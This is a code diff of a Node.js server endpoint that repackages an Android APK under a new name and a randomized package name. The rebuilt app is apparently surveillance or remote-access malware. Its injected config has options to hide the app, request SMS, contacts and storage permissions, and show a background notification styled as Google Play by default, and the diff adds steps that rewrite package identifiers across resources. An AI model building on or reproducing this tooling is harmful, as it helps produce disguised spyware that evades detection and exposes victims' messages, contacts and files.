@@ -94,7 +94,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const tempDir = path.join(__dirname, 'temp');
             const workDir = path.join(tempDir, `work-${uuid}`);
             const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
-            const finalApkName = `${(appName || "GalleryEye").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
+            const finalApkName = `${(appName || "HexaCore").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
             const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);
 
             // Cleanup
@@ -141,7 +141,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 letters[Math.floor(Math.random() * 26)];
 
             const newPackageName = `com.${cleanAppName}.${randomSuffix}`;
-            const oldPackageName = 'com.gallery.mediasync';
+            let oldPackageName = 'com.hexa.core';
+            if (fs.existsSync(manifestPath)) {
+                const rawManifest = fs.readFileSync(manifestPath, 'utf8');
+                const pkgMatch = rawManifest.match(/package="([^"]+)"/);
+                if (pkgMatch) oldPackageName = pkgMatch[1];
+            }
 
             // Update AndroidManifest.xml
             if (fs.existsSync(manifestPath)) {
@@ -228,6 +233,42 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 renameSmaliFolders(path.join(workDir, sDir));
             }
 
+            const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
+            const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged'];
+            if (fs.existsSync(attrsPath)) {
+                let attrsContent = fs.readFileSync(attrsPath, 'utf8');
+                for (const attr of missingAttrs) {
+                    if (!attrsContent.includes(`name="${attr}"`)) {
+                        attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
+                    }
+                }
+                fs.writeFileSync(attrsPath, attrsContent);
+            } else {
+                const attrsDir = path.join(workDir, 'res', 'values');
+                if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
+                fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n</resources>\n');
+            }
+            console.log('[APK] Material Design attributes patched');
+
+            const updateResXmlPackage = (dir) => {
+                if (!fs.existsSync(dir)) return;
+                const entries = fs.readdirSync(dir, { withFileTypes: true });
+                for (const entry of entries) {
+                    const entryPath = path.join(dir, entry.name);
+                    if (entry.isDirectory()) {
+                        updateResXmlPackage(entryPath);
+                    } else if (entry.name.endsWith('.xml')) {
+                        let content = fs.readFileSync(entryPath, 'utf8');
+                        if (content.includes(oldPackageName)) {
+                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                            fs.writeFileSync(entryPath, content);
+                        }
+                    }
+                }
+            };
+            updateResXmlPackage(path.join(workDir, 'res'));
+            console.log('[APK] Resource XMLs updated with new package name');
+
             // 3. Inject Config with permission flags
             await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
             const assetsDir = path.join(workDir, 'assets');
@@ -236,7 +277,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const config = {
                 hideApp: hideApp === 'true',
                 webLink: webLink || "",
-                appName: appName || "Gallery Eye",
+                appName: appName || "Hexa Core",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
@@ -257,7 +298,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             };
             const style = notificationStyle || "google_play";
             if (style === 'custom') {
-                config.notificationTitle = notificationTitle || (appName || "Gallery Eye");
+                config.notificationTitle = notificationTitle || (appName || "Hexa Core");
                 config.notificationText = notificationText || "Running in background";
                 config.notificationIcon = notificationIcon || "info";
             } else {
